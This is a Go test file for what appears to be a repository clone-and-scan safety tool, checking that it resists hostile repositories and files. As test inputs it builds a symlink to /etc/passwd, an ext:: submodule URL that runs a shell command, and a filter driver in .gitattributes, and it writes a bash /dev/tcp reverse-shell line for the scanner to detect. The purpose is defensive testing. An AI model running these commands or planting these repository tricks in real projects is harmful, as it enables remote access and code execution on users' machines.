package safety

import (
	"context"
	"net/http/cgi"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// hostileRepo builds a bare repository whose content tries the classic clone
// attacks: a symlink to a system file, an ext:: submodule that runs a command,
// and a filter driver named in .gitattributes.
func hostileRepo(t *testing.T, marker string) string {
	t.Helper()
	root := t.TempDir()
	work, bare := filepath.Join(root, "work"), filepath.Join(root, "repo.git")
	git := func(dir string, args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1",
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	os.MkdirAll(work, 0o755)
	git(work, "init", "-q", "-b", "main")
	os.Symlink("/etc/passwd", filepath.Join(work, "passwd-link"))
	os.WriteFile(filepath.Join(work, ".gitattributes"), []byte("* filter=evil\n"), 0o644)
	os.WriteFile(filepath.Join(work, ".gitmodules"), []byte("[submodule \"x\"]\n\tpath = sub\n\turl = ext::sh -c touch% "+marker+"\n"), 0o644)
	git(work, "add", "-A")
	// A gitlink for the submodule path, without fetching anything.
	git(work, "update-index", "--add", "--cacheinfo", "160000,"+strings.Repeat("a", 40)+",sub")
	git(work, "commit", "-q", "-m", "hostile")
	git(root, "clone", "-q", "--bare", work, bare)
	git(bare, "config", "http.receivepack", "false")
	return root
}

func TestCloneResistsHostileRepository(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	backend := filepath.Join(strings.TrimSpace(gitOutput(t, "--exec-path")), "git-http-backend")
	if _, err := os.Stat(backend); err != nil {
		t.Skip("git-http-backend not available")
	}
	marker := filepath.Join(t.TempDir(), "pwned")
	root := hostileRepo(t, marker)
	srv := httptest.NewServer(&cgi.Handler{Path: backend, Env: []string{"GIT_PROJECT_ROOT=" + root, "GIT_HTTP_EXPORT_ALL=1"}})
	defer srv.Close()

	dest := filepath.Join(t.TempDir(), "clone")
	if err := Clone(context.Background(), srv.URL+"/repo.git", dest, DefaultCloneLimits); err != nil {
		t.Fatalf("Clone: %v", err)
	}
	info, err := os.Lstat(filepath.Join(dest, "passwd-link"))
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode()&os.ModeSymlink != 0 {
		t.Error("symlink was checked out as a symlink; it must be a plain file")
	}
	if b, _ := os.ReadFile(filepath.Join(dest, "passwd-link")); strings.Contains(string(b), "root:") {
		t.Error("the checkout contains /etc/passwd's contents")
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("the ext:: submodule ran a command")
	}
	if entries, _ := os.ReadDir(filepath.Join(dest, "sub")); len(entries) > 0 {
		t.Error("the submodule was cloned")
	}

	r, err := Scan(context.Background(), dest, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range r.Findings {
		if strings.Contains(f.Evidence, "root:") {
			t.Errorf("a finding exposes system file contents: %+v", f)
		}
	}
}

func TestScanResistsHostileFiles(t *testing.T) {
	dir := t.TempDir()
	// A symlink created directly on disk (as a local `check ./path` could meet)
	// must not be followed, and odd names must not break the walk.
	os.Symlink("/etc/passwd", filepath.Join(dir, "link"))
	os.Symlink("..", filepath.Join(dir, "up"))
	write(t, dir, map[string]string{
		"weird name\n<script>.js":         "bash -i >& /dev/tcp/1.2.3.4/1 0>&1",
		strings.Repeat("d/", 60) + "x.sh": "echo deep",
	})
	big := filepath.Join(dir, "big.js")
	f, _ := os.Create(big)
	f.Truncate(50 << 20) // sparse 50 MB file: skipped, not read
	f.Close()
	r, err := Scan(context.Background(), dir, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range r.Findings {
		if f.Path == "link" || f.Path == "up" || strings.HasPrefix(f.Path, "up/") {
			t.Errorf("followed a symlink: %+v", f)
		}
	}
	if !rulesFound(r)["safety.reverse-shell"] {
		t.Error("a file with an odd name was not scanned")
	}
	if r.Skipped < 1 {
		t.Error("the oversized file was not skipped")
	}
}

func gitOutput(t *testing.T, args ...string) string {
	t.Helper()
	out, err := exec.Command("git", args...).Output()
	if err != nil {
		t.Fatal(err)
	}
	return string(out)
}

// datedRepo serves a bare repository whose commits are dated in dates.
func datedRepo(t *testing.T, dates ...string) string {
	t.Helper()
	root := t.TempDir()
	work := filepath.Join(root, "work")
	git := func(dir string, env []string, args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		cmd.Env = append(append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_NOSYSTEM=1",
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com"), env...)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	os.MkdirAll(work, 0o755)
	git(work, nil, "init", "-q", "-b", "main")
	for i, d := range dates {
		os.WriteFile(filepath.Join(work, "f.txt"), []byte(strings.Repeat("x", i+1)), 0o644)
		git(work, nil, "add", "-A")
		git(work, []string{"GIT_AUTHOR_DATE=" + d, "GIT_COMMITTER_DATE=" + d}, "commit", "-q", "-m", "c")
	}
	git(root, nil, "clone", "-q", "--bare", work, "repo.git")
	return root
}

// A clone with Since keeps the commits since then; with none that recent, it
// still fetches the latest one.
func TestCloneSince(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	backend := filepath.Join(strings.TrimSpace(gitOutput(t, "--exec-path")), "git-http-backend")
	if _, err := os.Stat(backend); err != nil {
		t.Skip("git-http-backend not available")
	}
	root := datedRepo(t, "2020-01-01T00:00:00Z", "2025-06-01T00:00:00Z", "2026-06-01T00:00:00Z")
	srv := httptest.NewServer(&cgi.Handler{Path: backend, Env: []string{"GIT_PROJECT_ROOT=" + root, "GIT_HTTP_EXPORT_ALL=1"}})
	defer srv.Close()

	for _, c := range []struct {
		since time.Time
		want  string
	}{
		{time.Time{}, "1"},
		{time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC), "2"},
		{time.Date(2027, 1, 1, 0, 0, 0, 0, time.UTC), "1"},
	} {
		dest := filepath.Join(t.TempDir(), "clone")
		limits := DefaultCloneLimits
		limits.Since = c.since
		if err := Clone(context.Background(), srv.URL+"/repo.git", dest, limits); err != nil {
			t.Fatalf("Clone since %v: %v", c.since, err)
		}
		if got := strings.TrimSpace(gitOutput(t, "-C", dest, "rev-list", "--count", "HEAD")); got != c.want {
			t.Errorf("since %v: %s commits, want %s", c.since, got, c.want)
		}
	}
}
